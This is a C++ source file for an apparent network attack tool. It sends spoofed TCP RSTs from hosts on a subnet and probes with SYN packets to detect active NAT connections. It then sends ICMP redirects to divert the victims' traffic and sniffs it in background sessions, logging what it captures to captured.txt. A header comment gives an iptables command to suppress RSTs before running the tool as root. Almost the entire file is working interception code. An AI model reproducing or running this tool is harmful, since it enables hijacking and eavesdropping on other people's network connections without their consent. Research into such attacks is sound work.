/*
 * attack_s.cpp  —  sequential version
 *
 * Iterates ports one by one, blocks one by one.
 * On c-ACK: sends ICMP redirect, spawns a background capture session,
 * then moves immediately to the next port (no waiting for sniff to finish).
 * All capture sessions run concurrently; they self-terminate after SNIFF_WAIT
 * seconds via an internal timer + stop_sniff(). Captured traffic is printed
 * to terminal and appended to captured.txt.
 *
 * NOTE: suppress kernel RST responses before running:
 *   sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
 *
 * Build:  make attack_s
 * Run:    sudo ./attack_s --ports <file> --subnet 24
 *         sudo ./attack_s --ports <file> --hosts  <mac_ip_file>
 */

#include "common.h"

static void usage(const char* prog) {
    cerr << "Usage:\n"
         << "  " << prog << " --ports <file> --subnet <prefix>  [options]\n"
         << "  " << prog << " --ports <file> --hosts  <file>    [options]\n"
         << "\nOptions:\n"
         << "  --block       IPs per block           (default 10)\n"
         << "  --nat-wait    seconds after RST        (default " << NAT_CLEAR_WAIT  << ")\n"
         << "  --syn-wait    seconds to wait for SYN response (default " << SYN_WAIT << ")\n"
         << "  --block-wait  pause between blocks on no-response (default " << INTER_BLOCK_WAIT << ")\n";
}

int main(int argc, char* argv[]) {
    ts_ms();   // start clock

    string ports_file, hosts_file;
    int prefix = -1, block_sz = 10;
    int nat_wait = NAT_CLEAR_WAIT, syn_wait = SYN_WAIT, inter_block = INTER_BLOCK_WAIT;

    for (int i = 1; i < argc; i++) {
        string a = argv[i];
        if      (a == "--ports"      && i+1 < argc) ports_file  = argv[++i];
        else if (a == "--hosts"      && i+1 < argc) hosts_file  = argv[++i];
        else if (a == "--subnet"     && i+1 < argc) prefix      = stoi(argv[++i]);
        else if (a == "--block"      && i+1 < argc) block_sz    = stoi(argv[++i]);
        else if (a == "--nat-wait"   && i+1 < argc) nat_wait    = stoi(argv[++i]);
        else if (a == "--syn-wait"   && i+1 < argc) syn_wait    = stoi(argv[++i]);
        else if (a == "--block-wait" && i+1 < argc) inter_block = stoi(argv[++i]);
    }

    if (ports_file.empty() || (prefix < 0 && hosts_file.empty())) {
        usage(argv[0]); return 1;
    }

    auto ports = load_ports(ports_file);
    if (ports.empty()) { cerr << "No ports loaded\n"; return 1; }
    cout << ts() << "Ports: " << ports.size() << "\n";

    vector<Host> all_hosts;
    if (!hosts_file.empty()) {
        all_hosts = load_hosts(hosts_file);
        cout << ts() << "Hosts from file: " << all_hosts.size() << "\n";
    } else {
        for (auto& ip : subnet_hosts(ATTACKER_IP, prefix))
            all_hosts.push_back({ip, ""});
        cout << ts() << "Hosts from /" << prefix << ": " << all_hosts.size() << "\n";
    }

    NetworkInterface iface(IFACE);
    PacketSender     sender;
    string           self_mac = iface.hw_address().to_string();

    cout << ts() << "Resolving gateway MAC (" << GATEWAY_IP << ")... ";
    string gw_mac = resolve_mac(GATEWAY_IP, iface, sender);
    cout << gw_mac << "\n";

    map<string,string> mac_cache;
    for (const auto& h : all_hosts)
        if (!h.mac.empty()) mac_cache[h.ip] = h.mac;

    vector<vector<Host>> blocks;
    for (size_t i = 0; i < all_hosts.size(); i += block_sz) {
        size_t end = min(i + (size_t)block_sz, all_hosts.size());
        blocks.emplace_back(all_hosts.begin() + i, all_hosts.begin() + end);
    }
    cout << ts() << all_hosts.size() << " hosts in " << blocks.size()
         << " blocks (k=" << block_sz << ")\n\n";

    ofstream cap_log("captured.txt", ios::app);
    mutex    log_mtx;
    vector<thread> sessions;   // capture sessions — joined at end

    for (uint16_t port : ports) {
        cout << ts() << "=== Port " << port << " ===\n";
        bool port_done = false;

        for (size_t bi = 0; bi < blocks.size() && !port_done; bi++) {
            const auto& block = blocks[bi];
            cout << ts() << "  Block " << bi+1 << "/" << blocks.size()
                 << " [" << block.front().ip << " .. " << block.back().ip << "]\n";

            // 1. RST from every IP in block
            cout << ts() << "  Sending " << block.size() << " RSTs...\n";
            rst_block(block, port, iface, sender, self_mac, gw_mac);

            // 2. Wait for NAT to clear CLOSE-state entries
            cout << ts() << "  Waiting " << nat_wait << "s for NAT...\n";
            this_thread::sleep_for(chrono::seconds(nat_wait));

            // 3. SYN probe — sniffer created here so stop_sniff() is accessible
            ProbeResult result;
            atomic<bool> probe_stop{false};
            Sniffer probe_sn(IFACE, sniffer_cfg(probe_filter(port)));
            thread probe_th([&]() { probe_listen(probe_sn, result, probe_stop); });
            this_thread::sleep_for(chrono::milliseconds(100));

            cout << ts() << "  Sending SYN from " << ATTACKER_IP << ":" << port << "...\n";
            syn_probe(port, iface, sender, self_mac, gw_mac);

            this_thread::sleep_for(chrono::seconds(syn_wait));
            probe_stop = true;
            probe_sn.stop_sniff();   // unblocks next_packet() if stuck
            probe_th.join();

            if (result.syn_ack) {
                cout << ts() << "  -> SYN-ACK: no active mapping in block\n\n";
                continue;
            }

            if (result.c_ack) {
                uint32_t seq = result.c_ack_ack.load();
                cout << ts() << "  -> c-ACK (ack=" << seq << "): active connection in block\n";

                // Resolve MACs (cached — only ARPs unknown IPs)
                for (const auto& h : block) {
                    if (!mac_cache.count(h.ip)) {
                        cout << ts() << "    ARP " << h.ip << "... ";
                        mac_cache[h.ip] = resolve_mac(h.ip, iface, sender);
                        cout << mac_cache[h.ip] << "\n";
                    }
                }

                // 4. Send ICMP redirect
                cout << ts() << "  Sending ICMP redirects...\n";
                icmp_redirect(block, port, seq, iface, sender, self_mac, gw_mac, mac_cache);

                // 5. Spawn background capture — returns immediately, runs SNIFF_WAIT seconds
                cout << ts() << "  Capture session started (sniffing " << SNIFF_WAIT << "s in background).\n\n";
                sessions.push_back(spawn_capture(block, port, SNIFF_WAIT, cap_log, log_mtx));

                port_done = true;
                cout << ts() << "  Port " << port << " done — moving to next port.\n\n";
            } else {
                cout << ts() << "  -> No response, waiting " << inter_block << "s...\n\n";
                this_thread::sleep_for(chrono::seconds(inter_block));
            }
        }

        if (!port_done)
            cout << ts() << "  No active mapping found for port " << port << "\n\n";
    }

    // Wait for all background capture sessions to finish
    if (!sessions.empty()) {
        cout << ts() << "Waiting for " << sessions.size()
             << " capture session(s) to finish...\n";
        for (auto& t : sessions) t.join();
    }

    cout << ts() << "All ports done. Captured traffic in captured.txt\n";
    return 0;
}
